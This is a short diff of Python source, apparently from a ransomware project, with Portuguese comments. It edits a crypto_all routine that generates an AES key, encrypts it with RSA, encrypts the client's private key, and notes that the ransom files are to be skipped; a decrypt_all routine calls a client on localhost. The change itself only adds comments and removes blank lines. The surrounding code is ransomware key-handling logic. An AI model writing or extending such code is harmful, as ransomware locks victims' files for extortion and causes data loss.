@@ -117,17 +117,15 @@ def gera_chave_AES():
 
 
 def crypto_all():
+    ## IGNORAR ARQUIVOS DO RANSOM
     AES_key=gera_chave_AES()
     print('[*] chave AES gerada')
     #menu(1) # -> criptografa tudo
-
     AES_to_RSA()
     print('[*] senha AES criptografado com chave RSA')
-
-
     RSA_to_SRSA()
     print('[*] chave privada do cliente criptografada')
-
+    # criar arquivo
 
 def decrypt_all():
     client('localhost')
